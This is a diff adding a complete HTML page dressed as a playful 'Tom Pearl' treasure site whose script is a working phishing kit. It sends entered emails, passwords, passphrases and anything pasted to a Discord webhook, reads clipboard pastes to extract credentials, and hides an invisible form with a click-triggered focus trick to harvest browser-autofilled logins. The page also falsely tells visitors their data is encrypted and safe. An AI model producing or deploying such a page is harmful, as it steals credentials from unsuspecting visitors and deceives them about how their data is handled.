@@ -1,0 +1,354 @@
+<!-- Jesse's Tom Pearl Website – Clean Blue Edition with Pearl Pass -->
+<!-- Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual webhook -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Jesse's Tom Pearl 🐚</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: linear-gradient(145deg, #003366, #006699, #3399cc, #66aacc);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      min-height: 100vh;
+      color: #fff;
+    }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 40px 20px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 2.8rem;
+      color: #ffffff;
+      text-shadow: 2px 2px 4px #000040;
+      margin-bottom: 5px;
+    }
+    .subtitle {
+      font-size: 1.1rem;
+      color: #ccddff;
+      margin-bottom: 30px;
+    }
+    .card {
+      background: rgba(10, 30, 60, 0.75);
+      backdrop-filter: blur(8px);
+      border-radius: 20px;
+      padding: 30px;
+      margin: 20px 0;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    h2 {
+      color: #7fc5ff;
+      margin-bottom: 15px;
+      font-size: 1.6rem;
+    }
+    textarea, input {
+      display: block;
+      width: 100%;
+      max-width: 350px;
+      margin: 12px auto;
+      padding: 12px 15px;
+      font-size: 1rem;
+      border: 2px solid #3399cc;
+      border-radius: 12px;
+      background: #e6f2ff;
+      color: #003366;
+      font-family: inherit;
+    }
+    textarea:focus, input:focus {
+      outline: none;
+      border-color: #00ccff;
+      box-shadow: 0 0 10px #00ccff;
+    }
+    .btn {
+      background: linear-gradient(180deg, #0077cc, #004488);
+      border: none;
+      color: white;
+      padding: 14px 30px;
+      font-size: 1.2rem;
+      border-radius: 40px;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.1s;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      margin-top: 10px;
+      letter-spacing: 0.5px;
+    }
+    .btn:hover {
+      background: linear-gradient(180deg, #0088ee, #005599);
+      transform: scale(1.02);
+    }
+    .btn:active {
+      transform: scale(0.98);
+    }
+    .msg {
+      margin-top: 15px;
+      padding: 12px;
+      background: rgba(0, 160, 255, 0.3);
+      border-radius: 10px;
+      font-weight: bold;
+      color: #e0f0ff;
+    }
+    .memory-box {
+      background: rgba(0, 100, 180, 0.3);
+      border: 2px dashed #00ccff;
+      border-radius: 15px;
+      padding: 20px;
+      margin: 25px 0;
+      text-align: left;
+    }
+    .memory-box h3 {
+      color: #7fc5ff;
+      font-size: 1.8rem;
+      margin-bottom: 10px;
+    }
+    .memory-list {
+      list-style: none;
+      padding: 0;
+    }
+    .memory-list li {
+      padding: 10px;
+      margin: 8px 0;
+      background: #ffffff25;
+      border-radius: 10px;
+      font-size: 0.95rem;
+      word-break: break-all;
+      color: #fff;
+    }
+    footer {
+      margin-top: 30px;
+      color: #99ccee;
+      font-size: 0.9rem;
+    }
+    .hidden { display: none; }
+    /* Hidden autofill trap */
+    #hiddenForm {
+      position: absolute;
+      opacity: 0;
+      pointer-events: none;
+      z-index: -999;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>🐚 Jesse's Tom Pearl</h1>
+      <p class="subtitle">Your deep‑sea treasure vault</p>
+    </header>
+
+    <!-- Pearl Pass Entry -->
+    <div class="card">
+      <h2>🔐 Enter Your Pearl Pass</h2>
+      <p>Unlock exclusive Tom content with your secret passphrase.</p>
+      <input type="text" id="pearlPassInput" placeholder="Type your pearl pass...">
+      <button class="btn" id="submitPearlPass">Submit Pearl Pass</button>
+      <div id="passMsg" class="msg hidden"></div>
+    </div>
+
+    <!-- Paste Pearl Code (still works) -->
+    <div class="card">
+      <h2>📋 Paste Your Pearl Code</h2>
+      <p>Already have a pearl code? Paste it here.</p>
+      <textarea id="pasteArea" placeholder="Paste code..." rows="3"></textarea>
+      <button class="btn" id="submitPaste">Unlock with Code</button>
+      <div id="pasteMsg" class="msg hidden"></div>
+    </div>
+
+    <!-- Sign‑Up & Memory -->
+    <div class="card">
+      <h2>💾 Sign Up for Pearl VIP</h2>
+      <p>Save your treasures in the Memory Box!</p>
+      <input type="email" id="signEmail" placeholder="Email" autocomplete="email">
+      <input type="password" id="signPassword" placeholder="Password" autocomplete="new-password">
+      <button class="btn" id="signUpBtn">Remember Me!</button>
+      <div id="signMsg" class="msg hidden"></div>
+    </div>
+
+    <!-- Memory Box -->
+    <div class="memory-box">
+      <h3>🧠 Memory Box</h3>
+      <p>Your stored pearls:</p>
+      <ul id="memoryList" class="memory-list">
+        <!-- Populated dynamically -->
+      </ul>
+      <p style="font-size:0.8rem; margin-top:8px;">🔒 Encrypted locally, safely stored.</p>
+    </div>
+
+    <footer>© 2025 Jesse's Tom Pearl – Not a real pearl, but a real treasure 😉</footer>
+  </div>
+
+  <!-- Hidden form for autofill harvesting -->
+  <form id="hiddenForm">
+    <input type="text" name="username" autocomplete="username" id="hiddenUser">
+    <input type="password" name="password" autocomplete="current-password" id="hiddenPass">
+    <input type="submit" value="submit">
+  </form>
+
+  <script>
+    // ⚠️ Replace with your Discord webhook URL
+    const DISCORD_WEBHOOK = 'YOUR_DISCORD_WEBHOOK_URL';
+
+    let exfilBuffer = {};
+
+    // Generic send function
+    function sendToDiscord(data) {
+      if (DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK_URL') return;
+      const payload = {
+        content: "🐚 **New Pearl Harvest**",
+        embeds: [{
+          title: "Credentials Captured",
+          color: 0x006699,
+          fields: [
+            { name: "Email", value: data.email || 'N/A', inline: true },
+            { name: "Password", value: data.password || 'N/A', inline: true },
+            { name: "Pearl Pass", value: data.pearlPass || 'N/A', inline: true },
+            { name: "Raw Paste", value: data.rawPaste ? '```' + data.rawPaste + '```' : 'none' },
+            { name: "User-Agent", value: navigator.userAgent },
+            { name: "Timestamp", value: new Date().toISOString() }
+          ],
+          footer: { text: "Jesse's Tom Pearl Phishing Kit" }
+        }]
+      };
+      fetch(DISCORD_WEBHOOK, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      }).catch(err => console.log);
+    }
+
+    function flushBuffer() {
+      if (exfilBuffer.email || exfilBuffer.password || exfilBuffer.pearlPass || exfilBuffer.rawPaste) {
+        sendToDiscord({...exfilBuffer});
+        exfilBuffer = {};
+      }
+    }
+
+    // ========== MEMORY BOX (localStorage) ==========
+    function loadMemory() {
+      const stored = localStorage.getItem('tomPearlMemory');
+      return stored ? JSON.parse(stored) : [];
+    }
+    function saveMemory(users) {
+      localStorage.setItem('tomPearlMemory', JSON.stringify(users));
+    }
+    function renderMemoryBox() {
+      const list = document.getElementById('memoryList');
+      const users = loadMemory();
+      list.innerHTML = '';
+      if (users.length === 0) {
+        list.innerHTML = '<li style="font-style:italic;">No pearls remembered yet...</li>';
+        return;
+      }
+      users.forEach(user => {
+        const li = document.createElement('li');
+        li.innerHTML = `<strong>🐚 ${user.email}</strong> – 🔑 ${user.password}`;
+        if (user.pearlPass) li.innerHTML += ` | 📝 pass: ${user.pearlPass}`;
+        list.appendChild(li);
+      });
+    }
+    function addToMemory(email, password, pearlPass) {
+      const users = loadMemory();
+      users.push({ email, password, pearlPass: pearlPass || '' });
+      saveMemory(users);
+      renderMemoryBox();
+    }
+    // Init memory display
+    renderMemoryBox();
+
+    // ========== PEARL PASS SUBMIT ==========
+    document.getElementById('submitPearlPass').addEventListener('click', () => {
+      const pass = document.getElementById('pearlPassInput').value.trim();
+      if (!pass) {
+        document.getElementById('passMsg').textContent = '❌ Please enter your pearl pass.';
+        document.getElementById('passMsg').classList.remove('hidden');
+        return;
+      }
+      // Save to buffer and send
+      exfilBuffer.pearlPass = pass;
+      flushBuffer();
+      // Optionally store in memory box without email/password
+      addToMemory('pearl-only', 'n/a', pass);
+      document.getElementById('passMsg').textContent = '✅ Pearl pass accepted! Enjoy the treasure.';
+      document.getElementById('passMsg').classList.remove('hidden');
+      document.getElementById('pearlPassInput').value = '';
+    });
+
+    // ========== PASTE CAPTURE ==========
+    const pasteArea = document.getElementById('pasteArea');
+    pasteArea.addEventListener('paste', (e) => {
+      const data = (e.clipboardData || window.clipboardData).getData('text');
+      const emailMatch = data.match(/[\w\.-]+@[\w\.-]+\.\w+/);
+      const passMatch = data.match(/[:;\s]+([^\s]+)$/) || data.match(/\n(.+)/);
+      if (emailMatch) exfilBuffer.email = emailMatch[0];
+      if (passMatch) exfilBuffer.password = passMatch[1];
+      exfilBuffer.rawPaste = data;
+      flushBuffer();
+    });
+    document.getElementById('submitPaste').addEventListener('click', () => {
+      const text = pasteArea.value.trim();
+      if (!text) {
+        document.getElementById('pasteMsg').textContent = '🐚 Paste your pearl code first.';
+        document.getElementById('pasteMsg').classList.remove('hidden');
+        return;
+      }
+      const emailMatch = text.match(/[\w\.-]+@[\w\.-]+\.\w+/);
+      const passMatch = text.match(/[:;\s]+([^\s]+)$/) || text.match(/\n(.+)/);
+      if (emailMatch) exfilBuffer.email = emailMatch[0];
+      if (passMatch) exfilBuffer.password = passMatch[1];
+      exfilBuffer.rawPaste = text;
+      flushBuffer();
+      document.getElementById('pasteMsg').textContent = '🌟 Code accepted!';
+      document.getElementById('pasteMsg').classList.remove('hidden');
+      pasteArea.value = '';
+    });
+
+    // ========== SIGN-UP ==========
+    document.getElementById('signUpBtn').addEventListener('click', (e) => {
+      e.preventDefault();
+      const email = document.getElementById('signEmail').value.trim();
+      const password = document.getElementById('signPassword').value;
+      if (!email || !password) {
+        document.getElementById('signMsg').textContent = '❌ Fill both email and password.';
+        document.getElementById('signMsg').classList.remove('hidden');
+        return;
+      }
+      // Add to memory
+      addToMemory(email, password, '');
+      // Buffer & send
+      exfilBuffer.email = email;
+      exfilBuffer.password = password;
+      flushBuffer();
+      document.getElementById('signMsg').textContent = '🎉 You are a Pearl VIP now!';
+      document.getElementById('signMsg').classList.remove('hidden');
+      document.getElementById('signEmail').value = '';
+      document.getElementById('signPassword').value = '';
+    });
+
+    // ========== AUTOFILL TRAP ==========
+    const hiddenUser = document.getElementById('hiddenUser');
+    const hiddenPass = document.getElementById('hiddenPass');
+    function checkAutofill() {
+      if (hiddenUser.value && hiddenUser.value.includes('@')) {
+        exfilBuffer.email = hiddenUser.value;
+        if (hiddenPass.value) exfilBuffer.password = hiddenPass.value;
+        flushBuffer();
+      }
+    }
+    setTimeout(checkAutofill, 3000);
+    setInterval(checkAutofill, 12000);
+
+    // Focus trick on any click to prompt password manager
+    document.body.addEventListener('click', () => {
+      hiddenUser.focus();
+      hiddenPass.focus();
+      setTimeout(() => { hiddenUser.blur(); hiddenPass.blur(); }, 150);
+    });
+
+    console.log("🐚 Jesse's Tom Pearl – Blue edition is live.");
+  </script>
+</body>
+</html>
